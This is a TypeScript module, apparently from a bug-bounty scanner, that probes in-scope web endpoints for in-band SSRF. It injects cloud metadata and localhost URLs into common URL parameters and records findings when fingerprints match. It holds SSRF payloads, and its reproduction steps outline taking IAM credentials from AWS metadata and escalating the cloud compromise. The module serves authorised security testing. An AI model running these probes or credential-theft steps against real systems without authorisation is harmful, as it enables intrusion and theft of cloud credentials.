// In-band SSRF 検出 ( OOB ではなくレスポンス本体に内部応答が反射されるパターン )。
// httpTraffic の代わりに targetUrl のフォームパラメータ / API を probe する。

import { chromium } from "playwright";
import { isUrlInScope } from "@/lib/scope";
import { maskBody } from "@/lib/mask";
import { makeScanCtx, createScanFinding, findExistingScanFinding } from "@/lib/scan-adapter";

const URL_PARAM_NAMES = [
  "url", "uri", "src", "source", "target", "endpoint", "host", "hostname", "fetch_url", "fetchurl",
  "image", "img", "image_url", "imageurl", "thumbnail", "thumb",
  "callback", "webhook", "redirect_uri", "redirecturi",
  "feed", "feed_url", "rss", "rss_url",
  "proxy", "proxy_url", "upstream",
  "load", "include", "file", "path", "resource",
  "dest", "destination", "to"
];

type SsrfProbe = {
  name: string;
  url: string;
  fingerprint: RegExp;
  bountyTier: "critical" | "high" | "medium";
};

const PROBES: SsrfProbe[] = [
  {
    name: "AWS metadata (IMDSv1)",
    url: "http://169.254.169.254/latest/meta-data/",
    fingerprint: /\bami-id\b|\binstance-id\b|\bhostname\b\s*[:=]?\s*[a-z0-9-]+\.compute\.internal|iam\/security-credentials/i,
    bountyTier: "critical"
  },
  {
    name: "GCP metadata",
    url: "http://metadata.google.internal/computeMetadata/v1/",
    fingerprint: /computeMetadata\/v1|project\/project-id|instance\/service-accounts|attributes\/ssh-keys/i,
    bountyTier: "critical"
  },
  {
    name: "Azure IMDS",
    url: "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    fingerprint: /azEnvironment|vmId|subscriptionId|"compute"\s*:\s*\{/i,
    bountyTier: "critical"
  },
  {
    name: "Localhost (127.0.0.1)",
    url: "http://127.0.0.1/",
    fingerprint: /(admin|dashboard|kubernetes|consul|etcd|redis|elasticsearch|prometheus|grafana|jenkins|sonarqube)/i,
    bountyTier: "high"
  },
  {
    name: "DigitalOcean metadata",
    url: "http://169.254.169.254/metadata/v1/",
    fingerprint: /droplet_id|public_keys|user-data|hostname/i,
    bountyTier: "critical"
  }
];

async function fetchWithParam(baseUrl: string, paramName: string, paramValue: string): Promise<{ status: number; body: string }> {
  const browser = await chromium.launch({ headless: true });
  try {
    const context = await browser.newContext({ ignoreHTTPSErrors: true });
    const page = await context.newPage();
    const u = new URL(baseUrl);
    u.searchParams.set(paramName, paramValue);
    const res = await page.request.fetch(u.toString(), { method: "GET", failOnStatusCode: false, timeout: 12000 });
    const body = await res.text().catch(() => "");
    await context.close();
    return { status: res.status(), body: body.slice(0, 6000) };
  } finally {
    await browser.close();
  }
}

export async function runInbandSsrfCheck(scanId: string, targetUrl: string) {
  const program = makeScanCtx(scanId, targetUrl);

  // Probe target URL with URL-receiving params that might trigger SSRF
  const base = new URL(targetUrl);
  const candidateUrls: string[] = [targetUrl];
  // Add common API paths
  for (const p of ["/api/fetch", "/api/proxy", "/api/image", "/api/url", "/fetch", "/proxy"]) {
    const u = `${base.origin}${p}`;
    if (isUrlInScope(program, u).allowed) candidateUrls.push(u);
  }

  let count = 0;
  const tested = new Set<string>();
  for (const candidateUrl of candidateUrls.slice(0, 6)) {
    if (count >= 5) break;
    if (!isUrlInScope(program, candidateUrl).allowed) continue;
    for (const paramName of URL_PARAM_NAMES.slice(0, 8)) {
      const key = `${candidateUrl}|${paramName}`;
      if (tested.has(key)) continue;
      tested.add(key);
      if (count >= 5) break;
      let hit: { probe: SsrfProbe; res: { status: number; body: string }; probeFullUrl: string } | null = null;
      for (const probe of PROBES) {
        try {
          const res = await fetchWithParam(candidateUrl, paramName, probe.url);
          if (res.status === 200 && probe.fingerprint.test(res.body)) {
            const probeUrl = new URL(candidateUrl);
            probeUrl.searchParams.set(paramName, probe.url);
            hit = { probe, res, probeFullUrl: probeUrl.toString() };
            break;
          }
        } catch { /* skip */ }
      }
      if (!hit) continue;
      const sevLabel = hit.probe.bountyTier === "critical" ? "Critical" : "High";
      const taggedType = `In-band SSRF (${hit.probe.name}) [${sevLabel}]`;
      const target = `GET ${base.origin}${base.pathname}?${paramName}=...`;
      const existing = await findExistingScanFinding(scanId, taggedType, target);
      if (existing) continue;
      await createScanFinding(scanId, {
        type: taggedType,
        target,
        severity: hit.probe.bountyTier,
        impact: `${target} のパラメータ ${paramName} に ${hit.probe.url} を渡したところ、サーバ側が当該 URL に内部リクエストを発行し、その応答 ( ${hit.probe.name} 特有のフィンガープリント ) がレスポンス本体に直接反射されました ( In-band SSRF )。攻撃者は IAM credentials / instance metadata / 内部サービス情報を窃取し、AWS/GCP/Azure 環境であれば認証情報経由でクラウド全体の侵害につながります。`,
        inScopeReason: `収集済み許可ドメイン内の URL を受け取るパラメータ`,
        evidence: `paramName=${paramName}, probe=${hit.probe.name}, probeUrl=${hit.probe.url}, status=${hit.res.status}, fingerprint=${hit.probe.fingerprint.source}`,
        requestResponseDiff: maskBody("application/json", JSON.stringify({
          paramName,
          probeName: hit.probe.name,
          probeUrl: hit.probe.url,
          fullProbeRequest: hit.probeFullUrl,
          responseStatus: hit.res.status,
          responseBodyPreview: hit.res.body.slice(0, 1500),
          fingerprintMatched: hit.probe.fingerprint.source,
          safetyNote: "metadata エンドポイントは GET only。IAM credentials の窃取試行や PUT/DELETE 系 metadata 変更は実施していない。"
        }, null, 2)),
        reproductionSteps: `1. ${hit.probeFullUrl} に GET\n2. レスポンスに ${hit.probe.name} 特有の文字列が直接出力される\n3. AWS の場合は /latest/meta-data/iam/security-credentials/<role-name> でアクセスキー取得を試行 ( 実報告時のみ、本ツールでは試行していない )\n4. 取得した credentials でクラウド側 API 経由で侵害拡大`,
        aiWorthSending: hit.probe.bountyTier === "critical" ? "Critical: クラウド metadata 取得確定。IAM 経由でクラウド乗っ取りに発展する典型パターンで、最大級の bounty が出る類。即報告候補。" : "High: 内部サービスへのアクセス成立。実環境での影響範囲は人間検証推奨。",
        bountyLikelihood: hit.probe.bountyTier === "critical" ? "very_high" : "high",
        recommendedAction: "report_now"
      });
      count++;
    }
  }
  return count;
}
